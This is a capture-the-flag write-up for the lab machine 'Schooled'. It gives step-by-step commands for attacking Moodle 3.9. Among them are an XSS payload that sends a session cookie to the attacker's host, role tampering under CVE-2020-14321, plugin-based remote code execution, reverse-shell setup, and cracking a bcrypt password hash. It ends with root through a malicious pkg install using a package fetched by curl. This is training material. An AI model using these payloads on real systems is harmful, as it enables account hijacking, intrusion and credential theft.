# Schooled Writeup
![Schooled](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/Schooledtarjeta.png)

**Keyword summary:**
- VHost Brute Force
- Moodle (XSS)
- Stealing session cookie
- CVE-2020-25627
- CVE-2020-14321.
- Mass Assignment Attack
- Cracking Hashes from Moodle database
- Abusing sudoers privilege

# Enumeration
****
We will start by performing a scan of the ports that are open on the target IP, using the nmap tool.
This can be done as follows:
```bash
nmap -sS --min-rate 2500 -vvv -n --open -Pn [IP] 
```
Replace '[IP]' with the IP address to be scanned

![Puertos](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/Ports.PNG)

We will see that the open ports are:

- 22/tcp | ssh
- 80/tcp | http
- 33060/tcp | mysqlx

Now we can run the following command to get some more information about the open ports of the Target IP:
```bash
nmap -sCV -p22,80,33060 [IP]
```

By listing the ports of the target IP, we have identified that for now we are particularly interested in the webpage hosted on port 80.

### Website Enumeration
We will perform two enumeration processes on this page before entering it.

- With the tool "whatweb" we can obtain more information about this page.
- With the "http-enum" script provided by the nmap tool

```bash
whatweb [IP]
```
```bash
nmap --script http-enum -p80 [IP]
```
![whatweb&scriptnmap](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/whatweb%26scriptnmap.PNG)


"In this way, we can see that the website is primarily running on FreeBSD, and furthermore, we can observe what appears to be an email address "admissions@schooled.htb". What may interest us about this is that we have a domain "schooled.htb".

So, we will proceed to enter the website."

![web](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/web.PNG)


For now, we don't see anything interesting, so in case Virtual Hosting is being applied to the website, we'll add the domain we found earlier to the "/etc/hosts" file. Because in some cases, accessing the website via the IP address and accessing it via a domain is not the same.

**What is Virtual Hosting?** [https://httpd.apache.org/docs/2.4/vhosts/].


![schooled.htb](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/schooled.htb.PNG)

Let's enter the site again using this domain name

![webSchooled.htb](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/webSchooled.htb.PNG)

And in this case, the content of the web page is exactly the same.
So exploring the page a little more, in the "teachers" section we can see teachers that are part of the educational institution and their respective role in it. 

![teachers](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/teachers.PNG)

In this way we can see that as attackers we would be interested in accessing to the account of "Lianne Carter" teacher, since she has a manager role.

# Moodle
****
What we can do now in search of more information about the website is to apply a subdomain reconnaissance. This can be done through the tool "gobuster".

```bash
gobuster vhost -u http://schooled.htb -w [wordlistPATH] -t 64 --apend-domain
```
![subdominio](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/subdominio.PNG)

gobuster found as existing subdomain on the website **"moodle.schooled.htb "**.
So let's add this subdomain in our file "/etc/hosts".

![moodle.schooled.htb](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/moodle.schooled.htb.PNG)

**What is Moodle?** [https://es.wikipedia.org/wiki/Moodle]

![paginamoodle](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/paginamoodle.PNG)
Indeed, the website has a subdomain where we can see a Moodle that is part of the educational institution.

So let's create a new account and log into moodle.

Something curious is that when I try to register in Moodle, when I enter an email address it is required that it belongs to the domain **"student.schooled.htb "**.


![emailleakinfo](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/emailleakinfo.PNG)


(When incorporating this subdomain into the /etc/hosts file, it takes us to the same initial page.)

Once the account is created, we will encounter this:

![moodledashboard](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/moodledashboard.PNG)

If we go to the "site home" section, we will find a list of courses offered at the educational institution. By reviewing each of the courses, we can see that we can only self-enroll in the "Mathematics" course, which is led by Professor "Manuel Phillips". So, let's enroll in that course.

# Moodle Foothold
****
![Announcements](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/Announcements.PNG)
![reminder](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/reminder.PNG)

In the "Announcements" section of the "Mathematics" course where we enrolled, we can see the announcement titled "Reminder for joining students". In this announcement, the professor informs us that we need to set our **"MoodleNet profile"** and that he will be reviewing the profiles of enrolled students to verify that they have configured this field.

Therefore, by going to the Moodle profile settings, we can see the "MoodleNet profile" field.

![moodlenet](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/moodlenet.PNG)


**But... what type of information should go in this field?** 
Well, let's try entering a test word.

![test](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/test.PNG)


We see that in our Moodle profile it shows:

![showingtest](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/showingtest.PNG)

In this way, what we can try as attackers is to **verify if the "MoodleNet profile" field is vulnerable to XSS (Cross-Site Scripting).**

**What is Cross-Site Scripting (XSS)?** [https://www.welivesecurity.com/la-es/2021/09/28/que-es-ataque-xss-cross-site-scripting/]

So, what we will do is inject a test payload into the "MoodleNet profile" field, like the following:
```bash
<script>alert('XSSTest'.)</script>
```
This way, if we update the changes made to the Moodle profile and indeed the "MoodleNet profile" field is vulnerable to XSS, upon entering our Moodle profile, a small popup window will appear.

![XSSTest](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/XSSTest.PNG)

**Nice!**

### Exploiting XSS Vulnerabilities for Session Cookie Stealing
****
Considering that the professor will be reviewing the profiles of enrolled students in the course, we could attempt to **steal their session cookie** by injecting a malicious script into the ```"MoodleNet profile"``` field.

For this, we will use the following command to set up a simple web server on port 80 of our machine.
```python
python3 -m http.server 80
```
![python3sever](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/python3sever.PNG)


Now we will inject the following payload into the ```"MoodleNet profile"``` field which will be responsible for stealing the session cookie of the user who accesses our Moodle profile.

```sh
<script>var i=new Image(); i.src="http://[OurIP]/?cookie="+btoa(document.cookie);</script>
```

![cookie](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/cookie.PNG)



We can see how the session cookie of Professor "Manuel Phillips" is sent to our server. 
However, this cookie is encoded in base64, so we need to decode it.

![stealingcookie](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/stealingcookie.PNG)


```bash
MoodleSession=lan2a2hc9ub9qhkhdful6mnff2
```
Now that we have the session cookie of the professor, we can authenticate ourselves as the professor.

![cookieantes](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/cookieantes.PNG)

`We replace our cookie with Professor Manuel Phillips cookie.`

![cookiedespues](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/cookiedespues.PNG)

**Nice!**

![Impersonification](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/Impersonification.PNG)

We can see how in the top right corner it shows us that we are logged into the system as the user **"Manuel Phillips"**

![Perfilprofe](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/perfilprofe.PNG)

Reviewing the professor's profile, we can see that his email belongs to a different domain. We can try to see if this domain is listed as a subdomain of the educational institution's website. 
(However, this subdomain redirects us to the same initial page.)

# Moodle Version and Possible Vulnerabilities
****

As Moodle is an open-source application, we can investigate its contents through:
[https://github.com/moodle/moodle]

There is a file that allows us to see which version of Moodle we are currently using, and its path is:

``` theme/upgrade.txt ```
So we can place it in the browser and consult the file "upgrade.txt".
![versionmoodle](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/versionmoodle.PNG)

So, it appears that the **version of Moodle running on the server is "3.9"**.

With this information, we can use **"searchsploit"** to search for vulnerabilities related to this version of Moodle.


```bash
searchsploit Moodle 3.9
```

We can see theres an exploit titled as:
>Moodle 3.9 - Remote Code Execution (RCE) (Authenticated)

![searchsploit](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/searchsploit.PNG)

```bash
searchsploit -x 50180
```

![exploitanalisis](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/exploitanalisis.PNG)

Analyzing a little the structure of the exploit we can see that what it seems to be trying to do is to authenticate us as manager and then it tries to increase the privileges of the manager account to have the ability to install plugins on the system.

_At this point we could directly use the exploit and complete the machine eventually, however, to have a better understanding of what is going on regarding the vulnerability in this version of Moodle, we will do it manually._

It is important to mention that Moodle has a "Security Announcements" section, so we are interested in knowing the date of Moodle 3.9 version.

![moodledate](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/moodledate.PNG)

Thus, in the page [https://moodle.org/security/] we can check the date of Moodle 3.9 version 3.9

![moodlevuln](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/moodlevuln.PNG)

We can see that there is a vulnerability on this version of Moodle identified as: **CVE-2020-14321**
"Course enrolments allowed privilege escalation from teacher role to manager role, enabling Remote Code Execution (RCE) through a 'Mass Assignment Attack' vulnerability."

**¿Que es Mass Assignment Attack?**
https://www.vaadata.com/blog/what-is-mass-assignment-attacks-and-security-tips/

## Teacher Self-Assignment to Manager Role
****

Starting from the fact that we are authenticated as the Manuel Phillips Teacher, we are going to navigate to the list of participants in the mathematics course that this user directs. We can see that we have a small button named "Enrol Users" in which it seems we have the ability to enroll students to the course forcibly.

**At this point I would like to remind you that we had the information on which teachers were assigned to the educational institution.**

![teachers](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/teachers.PNG)

As attackers we would be interested in accessing the account of "Lianne Carter" teacher, since she has a manager role.
So let's try to add the user "Lianne Carter" to the mathematics course.

![Agregaralcurso](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/Agregaralcurso.PNG)

The user "Lianne Carter" has been successfully enrolled in the mathematics course.

![Agregada](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/Agregada.PNG)

So, let's remove this user from the list of course participants and let's analyze with **Burpsuite** what happens when the request is sent when adding the user "Lianne Carter" to the course.

`(request intercepted by Burpsuite)`
```sh
GET /moodle/enrol/manual/ajax.php?mform_showmore_main=0&id=5&action=enrol&enrolid= 10&sesskey=l7mA1kfKdK&_qf__enrol_manual_enrol_users_form=1&mform_showmore_id_main=0 &userlist%5B%5D=25&roletoassign=5&startdate=4&duration= HTTP/1.1
Host: moodle.schooled.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: */*
Accept-Language: en-US,en;q=0.5 6 Accept-Encoding: gzip, deflate, br
Content-Type: application/json 8 X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://moodle.schooled.htb/moodle/user/index.php?id=5 11 Cookie: MoodleSession=1an2a2hc9ub9qhkhdful6mnff2
```
`(Request Query parameters | From the request intercepted by Burpsuite)`

![burpsuite](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/burpsuite.PNG)

```It is important that the request intercepted by Burpsuite is sent to the Repeater, where we will make changes and send the request.```

We can see that the request passes two parameters of interest:
-`userlist%5B%5D = 25`
-`roletoassign = 5`

- **userlist%5B%5D**
To review the list of users in the system, we can see that if we consult our Moodle profile (which at this moment corresponds to the user Manuel Phillips). We can see that in the search bar the **"id "** of the profile corresponds to the one identified with the number "24".

![profileid](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/profileid.PNG)

If we change this value in our search engine, by the number "25".

![Lianncarterid](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/Lianncarterid.PNG)

We are redirected to the Moodle profile of the user "Liann Carter".

(I think this would correspond to a mild **Web Parameter Manipulation** vulnerability. [https://owasp.org/www-community/attacks/Web_Parameter_Tampering])

**Back to the point**

What we can do then, is that using Burpsuite, with the intercepted request we can change the value from "25" to "24". and then for the parameter:
- **roletoassign**
Moodle manages through the request sent what role as a teacher you want to have on the user to be added to the course through the parameter "roletoassign" **[What is too risky]**

We do not know what the value "5" refers to, but we could think that if this value is changed to a **"1"**. Usually this value refers to the **Administrator** role. So let's change this parameter with the idea that we will grant an **Administrator** privilege over the user we are going to add to the course.

Therefore, our intercepted request should look like this:

`(Modified request intercepted by Burpsuite)`

>GET /moodle/enrol/manual/ajax.php?mform_showmore_main=0&id=5&action=enrol&enrolid= 10&sesskey=l7mA1kfKdK&_qf__enrol_manual_enrol_users_form=1&mform_showmore_id_main=0 &userlist%5B%5D=```24```&roletoassign=```1```&startdate=4&duration= HTTP/1.1

>Host: moodle.schooled.htb
>.
>.
><SNIP>

Once the request has been sent through the **Burpsuite Repeater**, in the **Proxy** section of **Burpsuite**, let's drop the intercepted request.

When you drop the intercepted request, the user "Lianne Carter" will not be added to the course, so we are going to add her back in the normal way, without intercepting the request, just to have the facility to go to her profile.

Once in the profile of "Lianne Carter" we will be able to notice that we have the privileges of **Log in as Lianne Carter**.

![privilegiosLianne](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/privilegiosLianne.PNG)

**Nice!**

![logueado](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/logueado.PNG)

This is a Moodle implementation, we are authenticated as Manuel Phillips but logged in as Lianne Carter.

![manuelLianne](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/manuelLianne.PNG)


Now, logged in as this user, we will have access to a "Site administration" panel

![Site_administration](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/Site_administration.PNG)

**In Moodle one of the main ways to inject commands is usually the Plugins panel, however, despite being authenticated as Liann Carter, it seems that we do not have privileges to upload Plugins to the system**

![pluginsoff](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/pluginsoff.PNG)

# Mass Assignment Attack 
****
In the "Users" section we can see a section "Permissions".

![permissions](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/permissions.PNG)

There we will enter "Define roles"

![listapermissions](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/listapermissions.PNG)

If we click on "Manager" we seem to have an extensive list of everything that "Manager" role is allowed in Moodle and everything that "Manager" role is not allowed in Moodle.

**What can we come up with?** a **Mass Assignment Attack**
So we will click on "Edit", we will activate **Burpsuite** and we will "Save Changes" to intercept the request.

![burpsuitemass](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/burpsuitemass.PNG)

What we see in Burpsuite are those permissions and their value that the user "Lianne Carter" currently has in the system.

There is a **GitHub repository** about the (CVE-2020-14321) [https://github.com/HoangKien1020/CVE-2020-14321]

**Here**, in the section "Payload to full permissions" it seems to exploit a Mass Assignment Attack to have the full permissions in the system. We will see that the style of the Payload is very similar to what we have in Burpsuite, **so let's replace it**.

Now, we will verify that we have the privileges to upload Plugins to the system:


![pluginson](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/pluginson.PNG)


Now, from the same Github repository above, we can download the zip file that is uploaded as a plugin to Moodle [https://github.com/HoangKien1020/Moodle_RCE]

![zipupload](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/zipupload.PNG)

![zipconfirmed](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/zipconfirmed.PNG)

Trigger RCE
>moodle/blocks/rce/lang/en/block_rce.php?cmd=id

So that is the Path that we will have to write in our web browser to execute commands

![RCE](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/RCE.PNG)

## Reverse Shell 
****

Now, what we want to do is to send a **reverse shell** to our system

So with netcat we are going to establish a listening port, in my case I will do it on port "4444" and we will inject through the plugin the following command

![reverse](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/reverse.PNG)

- %26 = &

We have to URL-Encode the "&" because the system might not interpret the command.

Enumerating the system a bit in the path /usr/local/www/apache24/data/moodle

We will find a file "config.php" Containing database login credentials

![config](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/config.PNG)

It turns out that the value of $PATH of the user that provides us the shell in the system **www** is very short and does not cover all the ways in which there can be commands that can be used, for this, a solution that we can apply is in our system:

```bash
echo $PATH
```

We copy the value of our $PATH, (it doesn't matter that there are paths that may not exist on the target machine, this will serve us so that the user **www** of the shell can execute more commands). And in the target machine we write the command:

```bash
export PATH=[Here goes our $PATH] 
```
Now we will be able to use commands like 'mysql'.
Once that's done:

```bash
mysql -umoodle -pPlaybookMaster2020 -e 'show databases'
```
Here, the **'-e'** flag should be used to execute commands without entering an interactive 'mysql'. This is because we don't have an interactive console in the reverse shell, which would cause problems for executing interactive commands.

![showdatabases](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/showdatabases.PNG)

```bash
mysql -umoodle -pPlaybookMaster2020 -e 'show tables' moodle
```

![showtables](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/showtables.PNG)

```bash
mysql -umoodle -pPlaybookMaster2020 -e 'describe mdl_user' moodle
```

![columns](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/columns.PNG)

Here, the columns of interest would be: username | password | email.


```bash
mysql -umoodle -pPlaybookMaster2020 -e 'select username,password,email from mdl_user' moodle
```

![credenciales](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/credenciales.PNG)

Having a list of credentials, we can check if there are any sections in the directory /home

![home](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/home.PNG)


Of all these, we're interested in those of 'jamie' and 'steve' since they are the users with a directory in /home. Additionally, Jamie is an Admin and Steve is not listed in the database. So, let's copy the corresponding hash of Jamie (Admin) to our system.

If we crack the hash and consider the possibility of Jamie's password being reused, we could gain SSH access to the system. We can crack the hash using tools like hashcat, identifying the encryption format of the password. We can do this as follows:

### Pequeña anotación [¿Como reconocer probables formatos de Hashes?]


We can achieve this using regular expressions. 
We have our hash to crack:

![hashformat](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/hashformat.PNG)

In this way:
```bash
hashcat --example-hashes | grep -oP '\$2\w\$\d{2}\$'
```
This command utilizes hashcat's example hashes and searches for a specific pattern within them. The pattern begins with "$2", followed by a single character (represented as "w"), then another "$", followed by two digits, and finally ending with another "$".
**[It might sound complex, but essentially we're inputting the pattern observed in the hash we have.]**


![hashrecognize1](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/hashrecognize1.PNG)

And we see that there are at least 4 types of formats that fit our hash. However, we see that those in the form ($2a$05$) would be the most probable. So, let's filter for that pattern using grep:
**(It's necessary to place "\\" before the "$" signs to recognize them.)**
```bash
hashcat --example-hashes | grep '\$2a\$05\$' -B 11
```
![hashrecognize2](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/hashrecognize2.PNG)
And we can see that the most likely format of the hash is **"bcrypt"**

So, let's use **hashcat** to crack the hash

```bash
hashcat -m 3200 -a 0 hash /[wordlist] --user
```
Where:
- -m indicates the mode to use for cracking the hash (bcrypt)
- -a indicates the attack mode (brute force = 0)
- hash (name of the file containing the hash)
- wordlist = wordlist (it could be "rockyou.txt")
- --user (Flag that tells Hashcat the hash is in the format [User:Hash])

**(Another interesting note)**
If a hash has already been cracked with hashcat and we want to see the plaintext result, we can use:
```bash
hashcat -m 3200 --show hash --user
```
![hash](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/hash.PNG)


Thus the password for user Jamie is: **!QAZ2wsx**

Then, we can try to log in via **ssh** using Jamie's User and the password we cracked.

```bash
ssh jamie@[IP]
```
![userflag](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/userflag.PNG)

**Perfect!**

Now, since we find ourselves as the user **Jamie**, the idea is to become **root** inside the system.

with the command:

```bash
sudo -l
```

It is possible for us to see that we have some privileges at the **sudoers** level.

![sudoers](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/sudoers.PNG)

So, let's turn to a useful resource for situations where we have binaries we can execute: [https://gtfobins.github.io/]

![pkgtfobins](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/pkgtfobins.PNG)

**What's the goal?**
We can see that the privilege escalation exploitation of this binary uses fpm. The target machine doesn't have this resource, so we'll provide it.

Also, the 'id' field is where we'll be able to execute commands. However, we don't want to execute the 'id' command, but rather something like '/bin/bash'.

We can find the path to this binary by:

```bash
ls -l /bin/bash
```
![SUID](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/SUID.PNG)

We can see that the binary "/usr/local/bin/bash" has permissions "755".

Our **goal** would be for the binary located at "/usr/local/bin/bash" to have **SUID** permissions (4755).

**What is the SUID permission?** [https://www.scaler.com/topics/special-permissions-in-linux/]

**So...**
We will install **fpm** (On Arch Linux):

```bash
paru -S fpm
```
So, once fpm is installed on the machine, we can proceed as follows. We'll want our command to look like this:

![comandoSUID](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/comandoSUID.PNG)

And then we proceed to execute:

```bash
fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
```

And a ".txz" file will be created in our working directory. We will upload this file to the victim machine and proceed to install it.

`[Local Machine]`
```bash
python3 -m http.server
```
`[Target Machine]`
`[Note: do this in the /tmp directory]`
```bash
curl -o x-1.0.txz http://[OurIP]/[File]
```
Once we have the ".txz" file on the victim machine, according to gtfobins, we would have to execute:

```bash
sudo pkg install -y --no-repo-update ./x-1.0.txz
```

![SUIDaccomp](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/SUIDaccomp.PNG)

"/usr/local/bin/bash" now has SUID permissions.

![bashp](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/bashp.PNG)


The command bash -p starts a new instance of the Bash shell. The new Bash instance will inherit the privileges of the file owner, which in this case would be root.
![pwned.](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/pwned.PNG)


**Pwned.**

***


***
By: Josesito 
|
This writeup was done with the help of S4vitar's video (https://www.youtube.com/watch?v=HNHvMgQwHQM&t).

